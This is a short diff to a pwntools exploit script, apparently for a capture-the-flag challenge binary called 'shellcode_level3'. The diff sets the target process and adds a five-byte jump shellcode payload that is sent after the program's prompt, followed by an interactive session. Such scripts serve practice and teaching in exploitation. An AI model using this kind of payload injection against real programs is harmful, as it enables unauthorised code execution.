@@ -14,7 +14,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 debug = 1
 
 if debug:
-    io = process('./')
+    io = process('./shellcode_level3')
 else:
     io = remote('')
 
@@ -22,7 +22,9 @@ def p():
     gdb.attach(proc.pidof(io)[0])
 
 #one_gadget = [,,]
-
+sc = b"\xE9\x48\xD1\xFF\xFF"
+#p()
+io.sendlineafter(b"neng miao sha wo?", sc)
 
 io.interactive()
 
